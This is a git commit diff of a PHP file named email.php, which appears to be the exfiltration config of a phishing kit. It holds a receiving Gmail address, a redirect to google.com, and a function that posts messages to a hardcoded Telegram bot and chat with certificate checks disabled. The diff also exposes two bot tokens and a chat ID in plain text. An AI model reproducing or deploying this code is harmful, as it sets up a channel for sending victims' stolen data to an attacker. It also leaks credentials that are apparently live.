f97bb343a8568bd28b3a207488413c697c62f199
tijobs <164848437+tijobs@users.noreply.github.com>
2024-12-17 17:24:20 +0100

    Update email.php

--- email.php
+++ email.php
@@ -1,1 +1,28 @@
-<?php $Receive_email="tijobsworkers@gmail.com";$redirect="https://www.google.com/";function send_telegram_msg($message){	// Put Your Telegram Information Here	$botToken  = '7068862585:AAH_R_Kl_KXwMSzByEkBeo4kYCI-G9DjVwo';	$chat_id  = ['8179736651'];			$website="https://api.telegram.org/bot".$botToken;	foreach($chat_id as $ch){		$params=[		  'chat_id'=>$ch, 		  'text'=>$message,		];		$ch = curl_init($website . '/sendMessage');		curl_setopt($ch, CURLOPT_HEADER, false);		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 3);		curl_setopt($ch, CURLOPT_POST, 3);		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);		$result = curl_exec($ch);		curl_close($ch);	}	return true;}?>
+<?php 
+$Receive_email="tijobsworkers@gmail.com";
+$redirect="https://www.google.com/";
+function send_telegram_msg($message){
+	// Put Your Telegram Information Here
+	$botToken  = '8054681380:AAGq5oUs8XRxM6NhZA-N9F0D9hjwbfqECLU';
+	$chat_id  = ['8179736651'];
+	
+	
+	$website="https://api.telegram.org/bot".$botToken;
+	foreach($chat_id as $ch){
+		$params=[
+		  'chat_id'=>$ch, 
+		  'text'=>$message,
+		];
+		$ch = curl_init($website . '/sendMessage');
+		curl_setopt($ch, CURLOPT_HEADER, false);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 3);
+		curl_setopt($ch, CURLOPT_POST, 3);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+		$result = curl_exec($ch);
+		curl_close($ch);
+	}
+	return true;
+}
+?>
+
